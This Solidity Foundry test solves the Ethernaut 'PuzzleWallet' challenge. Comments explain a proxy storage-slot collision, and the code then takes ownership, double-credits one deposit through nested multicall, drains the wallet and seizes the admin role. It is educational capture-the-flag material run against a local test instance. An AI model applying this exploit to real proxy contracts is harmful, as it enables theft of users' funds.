// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PuzzleWallet/PuzzleWalletFactory.sol";
import "../src/Ethernaut.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testPuzzleWalletHack() public {
        /****************
         * Factory setup *
         *************** */
        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (
            address levelAddressProxy,
            address levelAddressWallet
        ) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(
            payable(levelAddressProxy)
        );
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(
            payable(levelAddressWallet)
        );
        vm.startPrank(player);
        /****************
         *    Attack     *
         *************** */
        /*
        !! Here the proxy pattern used is Transparent proxy pattern
        * First we need to understand a bit how proxies work. The big picture would be the following:
        * Let's say we have 2 contract here
        * User interact with the Proxy contract ( here: ethernautPuzzleProxy ), which store all data.
        * The Proxy contract will send the information to the Implementation contract
        *
        * The implementation of the proxy are implemented in the Implementation Contract ( here : ethernautPuzzleWallet )
        * This will allow ethernautPuzzleProxy owner ( here admin ) to updrade the pointer to the implementation
        * NB: interesting if changes need to be done in the Implementation contract
        * Usually one of the main task of the proxy contract is to handle updgrade / auth ( role )
        * Usually has a fallback function that will send all the user's interaction to the Implementation contract
        * ⚠️ done through delegatecall.
        *
        *   --PuzzleProxy--
        * In our case, the fallback function in PuzzleProxy is triggered if none other function is called.
        * In this contract, the only explicit function we can call without beeing admin is proposeNewAdmin
        *
        *   --PuzzleWallet--
        * In this contract, we see that we need to be whitelisted.
        *   => function addToWhitelist
        *
        * Let's look at the storage slot of both contract:
        * SLOT          PUZZLEPROXY             PUZZLEWALLET
        * 0             pendingAdmin            owner
        * 1             admin                   maxBalance
        * *** HOW TO BECOME OWNER ***
        * As we need to become admin, we need to overwrite SLOT1
        * => admin && maxBalance
        * There are 2 function modifying the state of maxBalance
        * init -> This function require maxBalance == 0; this is impossible as it's already been instantiated
        *
        *  setMaxBalance [restricted to white list]
        * checking if the contract's balance is 0.
        *
        * How to be whiteListed ?
        * it's require that msg.sender == owner;
        * So to be an owner || pendingAdmin, we need to attack SLOT 0
        * in PuzzpleProxy, there is a a function to proposeNewAdmin, open to anyone
        * NB: this is an external function
        * if we call this function, we will automatically become the owner of the PuzzleWallet
        * contract because both the variables are stored in slot 0
        *
        * *** HOW TO DRAIN FUNDS ***
        * We need to dive in execute function, which is the only one that make a call()
        * However it checks also the balance of the msg.sender
        * How to make the contract thinks we have more balance that we actually do ?
        *
        * There is the deposit function that update the values, however we only want to update balance and not maxBalance
        * we need to send Ether only once but increase value in our balances mapping twice
        *
        *
        * Multicall is an interesting one, it basically triggers multiple function at once
        * or we could call a same function multiple times in a single transaction
        *
        * Here is how it will happen:
        * 1) create our bytes selectors
        * 2) propose player as newAdmin
        * 3) Remember that the contracts share the storage newAdmin <-> Owner
        * 4) trigger the multi call with a msg.value && the double deposit selector
        * 5) we call the execute function to drain the contract
        * 7) set the new max balance passing the player casted as uint256 so we take over slot2 and become admin
        */

        emit log_address(ethernautPuzzleProxy.admin());
        emit log_address(ethernautPuzzleWallet.owner());

        // -- 1 --
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory nestedMultiCall = new bytes[](2);
        nestedMultiCall[0] = abi.encodeWithSignature("deposit()");
        nestedMultiCall[1] = abi.encodeWithSignature(
            "multicall(bytes[])",
            depositSelector
        );
        // -- 2 --
        ethernautPuzzleProxy.proposeNewAdmin(player);
        // -- 3 --
        ethernautPuzzleWallet.addToWhitelist(player);
        // -- 4 --
        ethernautPuzzleWallet.multicall{value: 1 ether}(nestedMultiCall);
        // -- 5 --
        ethernautPuzzleWallet.execute(player, 2 ether, bytes(""));
        assertEq(address(ethernautPuzzleWallet).balance, 0); // make sure balance is drained
        // -- 6 --
        ethernautPuzzleWallet.setMaxBalance(uint256(uint160(player)));

        /*****************
         *Level Submission*
         ***************  */
        assertEq(ethernautPuzzleProxy.admin(), player);
        assertEq(ethernautPuzzleWallet.owner(), player);
    }
}
